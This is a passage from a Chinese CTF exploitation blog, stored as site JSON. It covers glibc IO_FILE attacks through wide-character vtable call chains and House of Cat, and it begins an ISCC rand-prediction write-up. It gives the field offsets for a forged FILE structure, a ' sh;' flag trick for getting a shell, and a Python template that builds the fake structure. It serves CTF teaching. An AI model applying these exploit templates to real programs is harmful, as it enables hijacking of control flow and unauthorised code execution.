class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> _IO_wdoallocbuf (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class=\"comment\">// _IO_WXXXX调用，需要走到这里</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class=\"line\">             fp-&gt;_wide_data-&gt;_shortbuf + <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_wide_data-&gt;_IO_buf_base==0</code>和<code>_flags &amp; _IO_UNBUFFERED==0</code>。</p>\n<p>综上需要对伪造的IO_FILE进行一下设置：</p>\n<ul>\n<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code>，注意前面有两个空格</li>\n<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>\n<li><code>fp-&gt;_mode&lt;=0</code></li>\n<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>\n<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>\n<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>\n<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>\n<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>\n<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>\n</ul>\n<p>（2）利用<code>_IO_wfile_underflow_mmap</code>控制程序执行流（走<code>_IO_WDOALLOCATE</code>）</p>\n<p>调用链如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_wfile_underflow_mmap</span><br><span class=\"line\">    _IO_wdoallocbuf</span><br><span class=\"line\">        _IO_WDOALLOCATE</span><br><span class=\"line\">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class=\"number\">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>\n\n<p>在<code>_IO_wfile_underflow_mmap</code>中需要绕过一些检测，使其成功调用<code>_IO_wdoallocbuf</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">wint_t</span> _IO_wfile_underflow_mmap (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_codecvt</span> *<span class=\"title\">cd</span>;</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *read_stop;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class=\"line\"> </span><br><span class=\"line\">  cd = fp-&gt;_codecvt;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Maybe there is something left in the external buffer.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class=\"line\">      <span class=\"comment\">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class=\"line\">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class=\"line\">    <span class=\"comment\">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class=\"line\"><span class=\"comment\">       flags as appropriate.  */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* There is more in the external.  Convert it.  */</span></span><br><span class=\"line\">  read_stop = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Maybe we already have a push back pointer.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class=\"line\">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">      _IO_wdoallocbuf (fp);<span class=\"comment\">// 需要走到这里</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//......</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_flags &amp; _IO_NO_READS == 0</code>，<code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>和<code>_IO_read_ptr &lt; _IO_read_end</code>绕过前面的return。设置<code>_wide_data-&gt;_IO_buf_base == NULL</code>和<code>_wide_data-&gt;_IO_save_base == NULL</code>调用<code>_IO_wdoallocbuf (fp)</code>。</p>\n<p>综上需要对伪造的IO_FILE进行一下设置：</p>\n<ul>\n<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>\n<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>\n<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>\n<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>\n<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>\n<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>\n<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>\n<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>\n<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>\n</ul>\n<p>（3）利用<code>_IO_wdefault_xsgetn</code>控制程序执行流（走<code>_IO_WOVERFLOW</code>）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_wdefault_xsgetn</span><br><span class=\"line\">    __wunderflow</span><br><span class=\"line\">        _IO_switch_to_wget_mode</span><br><span class=\"line\">            _IO_WOVERFLOW</span><br><span class=\"line\">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class=\"number\">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>\n\n<p>在<code>_IO_wdefault_xsgetn</code>中需要绕过一些检测，使其成功调用<code>__wunderflow</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> _IO_wdefault_xsgetn (FILE *fp, <span class=\"type\">void</span> *data, <span class=\"type\">size_t</span> n)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> more = n;</span><br><span class=\"line\">  <span class=\"type\">wchar_t</span> *s = (<span class=\"type\">wchar_t</span>*) data;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (;;)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Data available. */</span></span><br><span class=\"line\">      <span class=\"type\">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class=\"line\">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((<span class=\"type\">size_t</span>) count &gt; more)</span><br><span class=\"line\">        count = more;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class=\"line\">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (count &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">        count = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"type\">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class=\"line\">          <span class=\"type\">int</span> i = (<span class=\"type\">int</span>) count;</span><br><span class=\"line\">          <span class=\"keyword\">while</span> (--i &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">        *s++ = *p++;</span><br><span class=\"line\">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            more -= count;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (more == <span class=\"number\">0</span> || __wunderflow (fp) == WEOF) <span class=\"comment\">//进入这里</span></span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n - more;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_wide_data-&gt;_IO_read_end - _wide_data-&gt;_IO_read_ptr== 0</code>不进入第一个if。之后需要<code>mode!=0</code>调用<code>__wunderflow(fp)</code>。</p>\n<p>之后要进入<code>_IO_switch_to_wget_mode</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">wint_t</span> __wunderflow (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_mode &lt; <span class=\"number\">0</span> || (fp-&gt;_mode == <span class=\"number\">0</span> &amp;&amp; _IO_fwide (fp, <span class=\"number\">1</span>) != <span class=\"number\">1</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_mode == <span class=\"number\">0</span>)</span><br><span class=\"line\">    _IO_fwide (fp, <span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_IO_in_put_mode (fp))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (_IO_switch_to_wget_mode (fp) == EOF) <span class=\"comment\">//进入这里</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">    <span class=\"comment\">// ......</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>mode&gt;0</code>（前面已经让mode!=0）绕过第一个if。之后需要<code>_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>，调用<code>_IO_switch_to_wget_mode</code>。</p>\n<p>最后真正进入<code>_IO_WXXXX</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class=\"comment\">// 需要走到这里</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    <span class=\"comment\">// .....</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要满足<code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>调用<code>_IO_WOVERFLOW</code>。</p>\n<p>综上需要对伪造的IO_FILE进行一下设置：</p>\n<ul>\n<li><code>_flags</code>设置为<code>0x800</code></li>\n<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>\n<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>\n<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>\n<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>\n<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>\n<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>\n<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>\n</ul>\n<h3 id=\"House-of-Cat\"><a href=\"#House-of-Cat\" class=\"headerlink\" title=\"House of Cat\"></a>House of Cat</h3><p>House of Cat利用了**_IO_wfile_jumps<strong>中的</strong>_IO_wfile_seekoff<strong>函数，最后</strong>_IO_switch_to_wget_mode<strong>函数中来攻击，在</strong>FSOP<strong>的情况下也是可行的，只需修改虚表指针的偏移来调用</strong>_IO_wfile_seekoff<strong>即可（通常是结合</strong>__malloc_assert<strong>，改vtable为</strong>_IO_wfile_jumps+0x10**）。</p>\n<p>调用链：<code>_IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW</code></p>\n<p><code>_IO_wfile_seekoff</code>如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">off64_t</span> _IO_wfile_seekoff (FILE *fp, <span class=\"type\">off64_t</span> offset, <span class=\"type\">int</span> dir, <span class=\"type\">int</span> mode)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">off64_t</span> result;</span><br><span class=\"line\">  <span class=\"type\">off64_t</span> delta, new_offset;</span><br><span class=\"line\">  <span class=\"type\">long</span> <span class=\"type\">int</span> count;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (mode == <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> do_ftell_wide (fp);</span><br><span class=\"line\">  <span class=\"type\">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class=\"line\">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class=\"line\">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class=\"line\">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class=\"line\">#需要绕过was_writing的检测</span><br><span class=\"line\">  <span class=\"type\">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">              || _IO_in_put_mode (fp));</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp)) <span class=\"comment\">//进入_IO_switch_to_wget_mode</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> WEOF;</span><br><span class=\"line\">......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>_IO_switch_to_wget_mode</code>如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> _IO_switch_to_wget_mode (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"type\">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class=\"comment\">// 需要走到这里</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    <span class=\"comment\">// .....</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果要利用<code>_IO_WOVERFLOW</code>，我们将其设置为<code>system</code>或者<code>one_gadget</code>，调用到这里就可以<code>get shell</code>。不过如果遇到了<strong>开启沙箱</strong>的情况，这种方法就不可行了，我们就要考虑其他方式。</p>\n<p>先看看<code>_IO_switch_to_wget_mode</code>调用<code>_IO_WOVERFLOW</code>的汇编代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0] </span><br><span class=\"line\">;rdi==fp</span><br><span class=\"line\">;rax=fp+0xa0==wide_data</span><br><span class=\"line\">0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class=\"line\">;rdx=wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0] ;rax=wide_data+0xe0==wide_data-&gt;vtable</span><br><span class=\"line\">0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18] </span><br><span class=\"line\">;call wide_data-&gt;vtable+0x18==_IO_WOVERFLOW</span><br></pre></td></tr></table></figure>\n\n<p>可以看到这个过程通过将<code>fp</code>传入寄存器<code>rdi</code>，并通过对寄存器<code>rdi</code>进行操作，从中取出<code>wide_data中的_IO_write_ptr</code>和<code>wide_data中的vtable</code>，最后调用<code>vtable中的_IO_WOVERFLOW</code>。</p>\n<p>可以看到<code>wide_data中的_IO_write_ptr</code>被放入<code>rdx</code>，<code>wide_data中的vtable</code>被放入<code>rax</code>，通过<code>call   qword ptr [rax + 0x18]</code>调用<code>_IO_WOVERFLOW</code>，而这个<code>vtable</code>也是通过<code>rdi</code>的偏移再间址访问再偏移取得的。由于<code>IO_FILE</code>结构已经被我们劫持，因此寄存器<code>rdi</code>中的值是我们伪造的<code>IO_FILE</code>，是可以被我们所控制的，因此<code>rdx</code>和<code>rax</code>都是可以被我们控制的，所以**除了可以控制<code>rax</code>为伪造的<code>_IO_WOVERFLOW</code>之外，我们还可以控制寄存器<code>rdx</code>**。</p>\n<p>这样我们就可以<strong>利用<code>setcontext</code>来控制程序流程</strong>了，后面无论是走<code>ROP的orw</code>还是走<code>shellcode的orw</code>都可以得到flag了。</p>\n<p><code>House of Cat</code>的模板如下：（具体情况还需要调试修改）</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_io_addr=heapbase+<span class=\"number\">0xb00</span> <span class=\"comment\"># 伪造的fake_IO结构体的地址</span></span><br><span class=\"line\">next_chain = <span class=\"number\">0</span></span><br><span class=\"line\">fake_IO_FILE=p64(rdi)         <span class=\"comment\">#_flags=rdi</span></span><br><span class=\"line\">fake_IO_FILE+=p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span></span><br><span class=\"line\">fake_IO_FILE +=p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">2</span>) <span class=\"comment\"># rcx!=0(FSOP)</span></span><br><span class=\"line\">fake_IO_FILE +=p64(fake_io_addr+<span class=\"number\">0xb0</span>)<span class=\"comment\">#_IO_backup_base=伪造rdx的值 </span></span><br><span class=\"line\">fake_IO_FILE +=p64(call_addr)<span class=\"comment\">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(<span class=\"number\">0</span>)  <span class=\"comment\"># _chain</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0x88</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(heapbase+<span class=\"number\">0x1000</span>)  <span class=\"comment\"># _lock = a writable address</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xa0</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE +=p64(fake_io_addr+<span class=\"number\">0x30</span>)<span class=\"comment\">#_wide_data,rax1_addr</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xc0</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(<span class=\"number\">1</span>) <span class=\"comment\">#mode=1</span></span><br><span class=\"line\">fake_IO_FILE = fake_IO_FILE.ljust(<span class=\"number\">0xd8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_IO_FILE += p64(libcbase+<span class=\"number\">0x2160c0</span>+<span class=\"number\">0x10</span>)  <span class=\"comment\"># vtable=IO_wfile_jumps+0x10 or ...</span></span><br><span class=\"line\">fake_IO_FILE +=p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span></span><br><span class=\"line\">fake_IO_FILE += p64(fake_io_addr+<span class=\"number\">0x40</span>)  <span class=\"comment\"># rax2_addr,wide_data-&gt;vtable</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"House-of-Kiwi-1\"><a href=\"#House-of-Kiwi-1\" class=\"headerlink\" title=\"House of Kiwi\"></a>House of Kiwi</h3><p><a href=\"https://www.anquanke.com/post/id/235598\">https://www.anquanke.com/post/id/235598</a></p>"},{"title":"ISCC_game","date":"2023-01-02T11:50:26.000Z","_content":"\n随机数猜数字的程序，改种子后自己写程序预测出数字。\n\n<!-- more -->\n\n首先查壳，是64位的，没有栈保护，动态链接，NX可执行\n\n这是个猜数字的程序。程序中用函数rand和srand生成随机数。第一次的种子seed=time(0)用srand(seed)生成第二次的种子v3，再用v3生成随机数v7\n\n```c\nint v7=rand()%0x64+1;\n```\n当我们连续9次猜对v7的时候，就会执行flag(),我们就成功了!\n但只要有一次猜错，都会执行exit(0)\n\n这题和之前写过的猜数字挺像的\n我们发现程序中的read函数有点问题\n```c\nread 